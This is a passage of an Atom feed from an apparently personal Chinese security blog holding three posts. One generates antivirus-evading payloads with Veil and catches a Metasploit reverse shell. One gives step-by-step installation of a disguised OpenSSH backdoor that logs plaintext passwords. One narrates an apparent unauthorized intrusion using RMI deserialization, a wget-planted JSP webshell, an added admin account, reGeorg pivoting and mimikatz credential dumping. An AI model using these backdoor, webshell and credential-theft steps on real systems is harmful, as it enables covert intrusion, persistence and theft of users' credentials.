alt=""><br>这里就不一一截图了。</p><p>看到这步点击<code>finish</code>了,然后继续安装。<br><img src="/images/Veil3.1免杀安装/4.PNG" alt=""><br>安装成功<br><img src="/images/Veil3.1免杀安装/5.PNG" alt=""></p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>在<code>Veil-master</code>文件夹下终端输入<code>./Veil.py</code>运行<br><img src="/images/Veil3.1免杀安装/6.PNG" alt=""><br>输入<code>use 1</code>然后 <code>list</code>查看<code>payload</code><br><img src="/images/Veil3.1免杀安装/7.PNG" alt=""><br>这里测试生成个<code>exe</code><br><code>use 5</code>，然后输入IP地址和端口<br><img src="/images/Veil3.1免杀安装/8.PNG" alt=""><br>这里输入要生成的文件名<br><img src="/images/Veil3.1免杀安装/9.PNG" alt=""><br>生成成功<br><img src="/images/Veil3.1免杀安装/10.PNG" alt=""></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>将生成的<code>exe</code>丢进<code>win7</code>运行，然后<code>kali运行msf开启监听</code><br><code>set payload windows/meterpreter/reverse_http</code><br><code>set lhost 192.11.22.64</code><br><code>set lport 8888</code><br><code>run</code><br>成功反弹<code>shell</code><br><img src="/images/Veil3.1免杀安装/11.PNG" alt=""><br>整个过程大致就这样，下次见。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;听说很难安装。&lt;br&gt;
    
    </summary>
    
      <category term="免杀" scheme="OneHone.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="Veil" scheme="OneHone.github.io/tags/Veil/"/>
    
      <category term="免杀" scheme="OneHone.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>OpenSSH后门的安装</title>
    <link href="OneHone.github.io/2018/03/22/OpenSSH%E5%90%8E%E9%97%A8%E7%9A%84%E5%AE%89%E8%A3%85/"/>
    <id>OneHone.github.io/2018/03/22/OpenSSH后门的安装/</id>
    <published>2018-03-21T16:00:00.000Z</published>
    <updated>2018-03-29T12:27:25.494Z</updated>
    
    <content type="html"><![CDATA[<p>本来想结合实战一起写出来的，但提权过程中出现了些问题，所以就单独写吧。<br><a id="more"></a><br>本机环境：<code>centos6.5</code> <code>OpenSSH_5.3p1</code></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>下载<code>openssh</code>的安装包和后门安装包。<br>安装包:<code>http://www.openssh.com</code><br>后门安装包:<code>http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</code></p><h3 id="为了伪装"><a href="#为了伪装" class="headerlink" title="为了伪装"></a>为了伪装</h3><p>在安装后门之前，先查看本机的ssh版本号<code>ssh-V</code><br><img src="/images/OpenSSH后门的安装/1.PNG" alt=""></p><h3 id="解压安装包"><a href="#解压安装包" class="headerlink" title="解压安装包"></a>解压安装包</h3><p><code>tar zxvf openssh-5.9p1.tar.gz</code><br><code>tar zxvf 0x06-openssh-5.9p1.patch.tar.gz</code><br><img src="/images/OpenSSH后门的安装/2.PNG" alt=""><br><img src="/images/OpenSSH后门的安装/3.PNG" alt=""></p><h3 id="注入后门"><a href="#注入后门" class="headerlink" title="注入后门"></a>注入后门</h3><p>将后门文件夹的<code>sshbd5.9p1.diff</code>复制到<code>openssh-5.9p1</code>文件夹中，并在该<code>openssh-5.9p1</code>文件夹执行<code>patch &lt;sshbd5.9p1.diff</code>命令<br><img src="/images/OpenSSH后门的安装/4.PNG" alt=""></p><h3 id="修改版本号和后门密码"><a href="#修改版本号和后门密码" class="headerlink" title="修改版本号和后门密码"></a>修改版本号和后门密码</h3><p>在<code>openssh-5.9p1</code>文件夹中执行<code>vim version.h</code>修改版本号（为了伪装，这里修改成一开始记下来的版本号），修改后门密码和记录密码的保存路径<code>vim includes.h</code><br><img src="/images/OpenSSH后门的安装/5.PNG" alt=""><br><img src="/images/OpenSSH后门的安装/6.PNG" alt=""><br><code>ilog</code>是记录别的机子登录本机的密码<br><code>olon</code>是记录本机登录到别的机子的密码<br>（这应该能理解吧）</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在安装之前先安装配置环境，不然会报错。<br><code>yum install -y openssl openssl-devel pam-devel</code><br><code>yum install zlib-devel</code><br><code>yum install gcc</code><br><code>yum install openssl</code><br><code>yum install openssl-devel</code></p><p>安装及编译：<br><code>./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</code></p><p><img src="/images/OpenSSH后门的安装/7.PNG" alt=""><br>显示到这个说明编译成功，然后执行<code>make</code>和<code>make install</code>命令安装<br>执行命令<code>sevice ssh restart</code>重启<code>ssh</code></p><h2 id="测试后门"><a href="#测试后门" class="headerlink" title="测试后门"></a>测试后门</h2><p><code>kali</code>链接<code>ssh</code><br><img src="/images/OpenSSH后门的安装/8.PNG" alt=""><br>查看登录过来的ssh密码<code>cat /tmp/ilog</code><br><img src="/images/OpenSSH后门的安装/9.PNG" alt=""><br>还是明文的<br>OK!大功告成</p><p>特别注意的是，整个过程都是在<code>root</code>用户下执行的，不然没有权限执行。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本来想结合实战一起写出来的，但提权过程中出现了些问题，所以就单独写吧。&lt;br&gt;
    
    </summary>
    
      <category term="后门" scheme="OneHone.github.io/categories/%E5%90%8E%E9%97%A8/"/>
    
    
      <category term="liunx后门" scheme="OneHone.github.io/tags/liunx%E5%90%8E%E9%97%A8/"/>
    
      <category term="OpenSSH" scheme="OneHone.github.io/tags/OpenSSH/"/>
    
  </entry>
  
  <entry>
    <title>JAVARMI漏洞之旅</title>
    <link href="OneHone.github.io/2018/03/17/JAVARMI%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%97%85/"/>
    <id>OneHone.github.io/2018/03/17/JAVARMI漏洞之旅/</id>
    <published>2018-03-16T16:00:00.000Z</published>
    <updated>2018-03-29T12:51:10.821Z</updated>
    
    <content type="html"><![CDATA[<p>博客刚搭建不久，有些美工还没做。<strong>##其实我不想在搞了，搭建个博客麻烦得要死。</strong><br><a id="more"></a><br>今天周末天气不错，兜兜转转也不懂要做什么。最近在研究RMI反序列化漏洞，就写一片文章吧。</p><h2 id="突破口"><a href="#突破口" class="headerlink" title="突破口"></a>突破口</h2><p>在一次<code>nmap</code>扫描过程中发现了目标机子8100端口存在<code>java RMI</code>服务<br><img src="/images/JAVARMI漏洞之旅/RMI1.PNG" alt=""><br>于是用<code>attackRMI.jar</code>链接该端口，成功回显系统信息 执行<code>cat /proc/version</code>  <code>id</code>  命令<br><img src="/images/JAVARMI漏洞之旅/RMI2.PNG" alt=""></p><h2 id="写马失败"><a href="#写马失败" class="headerlink" title="写马失败"></a>写马失败</h2><p><code>Liunx</code>的版本号比较低，<code>User</code>权限，<code>ifconfig</code>：10.xx.xx.13内网机子，对系统的基本信息了解之后，接下来就尝试着<code>echo</code>写一句话到<code>web</code>路径下（用菜刀连接，方便操作，因为使用<code>attackRMI.jar</code>只能在当前目录下操作，不能<code>cd</code>到别的目录），<code>echo 一句话&gt;&gt;/xxx/xxx/tomcat/webapps/root/xxx.jsp</code>（<code>web</code>路径疯狂ls才找到的） 运行完之后发现文件是创建了，但是字节为<code>0</code> 经过一番尝试之后发现<code>echo</code>命令用不了。</p><p>不能写内容到文件里去，于是想到了<code>wget</code>命令，<code>wget http://xxx.xxx.xxx/xxx.jsp -O /xxx/xxx/tomcat/webapps/root/xxx.jsp</code>（其中肉鸡的地址是<code>http</code> 马名字为<code>xxx.jsp</code>），运行后发现并没有成功写入到文件，排查原因发现该机子根本就不通外网。内网机子做了端口映射。</p><p>马儿出不了，那就翻翻有啥利用的东西。在经过疯狂的<code>ls</code>之后找到了几个数据库密码：<br><img src="/images/JAVARMI漏洞之旅/RMI3.PNG" alt=""></p><h2 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h2><p>既然突破不了，为何不去扫扫C段？果然在其同网段的一台机子的8800端口发现了同样的漏洞：<br><img src="/images/JAVARMI漏洞之旅/RMI4.PNG" alt=""><br>说干就干，运气不错，系统权限<br><img src="/images/JAVARMI漏洞之旅/RMI5.PNG" alt=""><br>windows 2008 32位 没有域<br><img src="/images/JAVARMI漏洞之旅/RMI6.PNG" alt=""></p><p><code>netstat -ano</code>对方开了3389<br><img src="/images/JAVARMI漏洞之旅/RMI7.PNG" alt=""><br>添加用户<br><code>net user admln admin /add &amp; net localgoup administrators admln /add</code><br>成功添加用户之后用<code>mstsc</code>命令远程链接发现报错：<br><img src="/images/JAVARMI漏洞之旅/RMI8.PNG" alt=""><br>原来该机子没有把自己的3389端口映射出来，不好的情况发生了，这台和之前的一样不能通外网，正当想办法的时候，小伙伴在该C段拿下了台<code>liunx</code>的机子，通过端口漏洞<code>jdwp</code>，过程大致说下，该漏洞是远程执行命令的，然后通过执行命令找到web服务的根路径，向其写入一句话。乌云有篇关于<code>jdwp</code>的文章，有兴趣的去看下。</p><h2 id="内网游游"><a href="#内网游游" class="headerlink" title="内网游游"></a>内网游游</h2><p>在已拿下的<code>liunx</code>机子上安装了<code>reGeorg</code>代理，然后通过代理远程链接之前的win 08机子<br><img src="/images/JAVARMI漏洞之旅/9.PNG" alt=""></p><p>用到<code>mimikatz</code>获取管理员的哈希及明文密码<br><img src="/images/JAVARMI漏洞之旅/RMI10.PNG" alt=""></p><p>之前写马失败的那台，通过<code>wget</code>到内网机子里获取到一句话,也成功拿下了。<br><img src="/images/JAVARMI漏洞之旅/11.PNG" alt=""></p><p>内网很大，这里就不继续写下去了。</p><p>刮好大的风啊，准备要下雨了，走人走人。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;博客刚搭建不久，有些美工还没做。&lt;strong&gt;##其实我不想在搞了，搭建个博客麻烦得要死。&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="RMI漏洞" scheme="OneHone.github.io/tags/RMI%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="内网渗透" scheme="OneHone.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
